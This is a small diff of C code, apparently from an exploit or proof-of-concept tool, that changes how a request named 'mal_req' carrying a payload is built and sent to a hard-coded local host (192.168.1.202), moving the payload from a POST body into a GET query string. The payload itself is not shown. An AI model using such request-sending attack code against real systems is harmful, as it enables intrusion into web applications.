@@ -182,14 +182,12 @@ int32_t main() {
 
     char mal_req[1024];
 
-    sprintf(mal_req, "POST /index.php? HTTP/1.1\r\n"
+    sprintf(mal_req, "GET /index.php?%s HTTP/1.1\r\n"
         "Host: 192.168.1.202\r\n"
         "Content-Type: application/x-www-form-urlencoded\r\n"
-        "Content-Length: %d\r\n"
         "Connection: Keep-Alive\r\n"
-        "\r\n"
-        "%s",
-        payload_len, payload);
+        "\r\n",
+        payload);
 
     _send(sockfd, mal_req, strlen(mal_req));
 
